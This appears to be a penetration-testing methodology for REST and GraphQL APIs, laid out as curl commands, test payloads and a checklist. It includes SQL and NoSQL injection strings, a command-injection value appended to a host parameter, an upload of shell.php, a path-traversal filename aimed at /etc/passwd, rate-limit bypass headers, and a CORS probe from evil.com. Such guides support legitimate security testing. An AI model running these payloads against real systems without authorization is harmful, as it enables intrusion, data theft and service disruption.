# API Security Testing Methodology

## Overview

APIs are the backbone of modern applications. They often have different security models than web UIs and can be goldmines for vulnerabilities.

## Types of APIs

### REST APIs
- HTTP-based
- JSON/XML payloads
- Stateless authentication (tokens)

### GraphQL
- Single endpoint
- Flexible queries
- Introspection capability

### WebSocket
- Persistent connections
- Real-time data
- Often less tested

## Discovery

### 1. Common API Paths
```
/api
/api/v1
/api/v2
/v1/api
/rest
/graphql
/swagger.json
/openapi.json
/api-docs
```

### 2. JavaScript Analysis
```javascript
// Look for API calls in JS files
fetch('/api/')
axios.get('/api/')
$.ajax('/api/')
```

### 3. Mobile App Analysis
- Decompile APK/IPA
- Extract API endpoints
- Find hardcoded keys

## Authentication Testing

### Token-Based Auth

**Test for:**
```
1. Missing authentication
   GET /api/users/123
   Without Authorization header

2. Weak token validation
   Authorization: Bearer invalid_token
   Authorization: Bearer 
   Authorization: null

3. Token manipulation
   Change JWT algorithm to "none"
   Modify JWT payload claims
```

### API Key Security

**Test for:**
```
1. Key in URL (logged in server logs)
   GET /api/users?api_key=secret

2. Weak key entropy
   api_key=12345
   api_key=test

3. Key reuse across environments
   Same key for dev/prod
```

## Authorization Testing (IDOR)

### Horizontal Privilege Escalation
```bash
# Your account
curl -H "Authorization: Bearer TOKEN" \
  https://api.target.com/users/me
# Returns: {"id": 12345, ...}

# Try other accounts
curl -H "Authorization: Bearer TOKEN" \
  https://api.target.com/users/12346

# Check different resources
curl -H "Authorization: Bearer TOKEN" \
  https://api.target.com/orders/10001
```

### Vertical Privilege Escalation
```bash
# Regular user accessing admin endpoints
curl -H "Authorization: Bearer USER_TOKEN" \
  https://api.target.com/admin/users

curl -H "Authorization: Bearer USER_TOKEN" \
  https://api.target.com/admin/config
```

## Input Validation Testing

### Injection Attacks

**SQL Injection:**
```bash
# Test parameters
curl "https://api.target.com/search?q=test'"
curl "https://api.target.com/search?q=test'--"

# JSON body
curl -X POST https://api.target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"query": "test\'"}'
```

**NoSQL Injection:**
```bash
# MongoDB style
curl -X POST https://api.target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
```

**Command Injection:**
```bash
# If parameter used in system calls
curl "https://api.target.com/api/ping?host=8.8.8.8;whoami"
```

### Mass Assignment

**Test for unprotected fields:**
```bash
# Normal request
curl -X POST https://api.target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "John", "email": "john@example.com"}'

# With extra fields
curl -X POST https://api.target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "name": "John",
    "email": "john@example.com",
    "role": "admin",
    "is_admin": true,
    "balance": 10000
  }'
```

## GraphQL Specific Tests

### Introspection
```graphql
# Check if introspection enabled
{
  __schema {
    types {
      name
    }
  }
}
```

### Query Depth/Nesting
```graphql
# Test for resource exhaustion
{
  user {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}
```

### Field Suggestion
```graphql
# Test for hidden fields
{
  user {
    id
    name
    password  # Does this exist?
    ssn       # Hidden field?
  }
}
```

### Batching
```graphql
# Multiple operations in one request
[
  {"query": "{ user1: user(id: 1) { name } }"},
  {"query": "{ user2: user(id: 2) { name } }"},
  {"query": "{ user3: user(id: 3) { name } }"}
]
```

## Rate Limiting & Abuse

### Bypass Techniques
```bash
# 1. Change IP (if behind proxy)
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4

# 2. Change User-Agent
User-Agent: Different Browser

# 3. Case sensitivity
/api/Users vs /api/users

# 4. Encoding
/api%2fusers
/api//users
```

### Resource Exhaustion
```bash
# Large payloads
curl -X POST https://api.target.com/api/data \
  -d "$(python -c 'print("A"*10000000)')"

# Deep nesting (GraphQL)
# Many simultaneous connections
```

## HTTP Method Testing

### Method Switching
```bash
# Test different methods on same endpoint
GET /api/users/123
POST /api/users/123
PUT /api/users/123
PATCH /api/users/123
DELETE /api/users/123

# Non-standard methods
TRACE /api/users/123
DEBUG /api/users/123
```

### Content-Type Confusion
```bash
# JSON endpoint accepting other formats
curl -X POST https://api.target.com/api/users \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><user><name>test</name></user>'

curl -X POST https://api.target.com/api/users \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test"
```

## Version Testing

### API Version Issues
```bash
# Test different versions
curl https://api.target.com/v1/users/123
curl https://api.target.com/v2/users/123
curl https://api.target.com/internal/users/123
curl https://api.target.com/beta/users/123

# Older versions may have weaker security
```

## File Upload Testing

### If API accepts file uploads:
```bash
# Upload executable
curl -X POST https://api.target.com/api/upload \
  -F "file=@shell.php"

# Path traversal in filename
curl -X POST https://api.target.com/api/upload \
  -F "file=@test.txt;filename=../../../etc/passwd"

# Size limits
curl -X POST https://api.target.com/api/upload \
  -F "file=@hugefile.bin"
```

## CORS Misconfiguration

### Test CORS policies
```bash
# Check Access-Control-Allow-Origin
curl -I https://api.target.com/api/users \
  -H "Origin: https://evil.com"

# Wildcard with credentials
curl -I https://api.target.com/api/users \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=xxx"
```

## Tools

### Manual Testing
- Postman / Insomnia
- Burp Suite
- curl / httpie

### Automated
```bash
# Nuclei for API vulnerabilities
nuclei -u https://api.target.com -t api/

# Kiterunner for API endpoint discovery
kr scan https://api.target.com -w routes-large.kite

# Arjun for parameter discovery
arjun -u https://api.target.com/endpoint
```

## Checklist

- [ ] API endpoints discovered
- [ ] Authentication bypass tested
- [ ] Authorization (IDOR) tested
- [ ] Input validation tested (injection)
- [ ] Mass assignment tested
- [ ] Rate limiting verified
- [ ] HTTP method switching tested
- [ ] Content-type confusion tested
- [ ] API versions compared
- [ ] GraphQL introspection checked (if applicable)
- [ ] CORS policies reviewed
- [ ] Error messages analyzed

---

*Methodology Version 1.0*
